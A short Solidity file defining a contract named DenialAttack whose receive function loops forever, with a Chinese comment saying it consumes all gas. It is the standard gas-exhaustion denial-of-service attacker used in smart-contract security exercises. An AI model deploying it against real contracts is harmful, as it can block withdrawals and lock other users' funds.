// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DenialAttack {
    receive() external payable {
        while(true) {}  // 消耗所有 gas
    }
}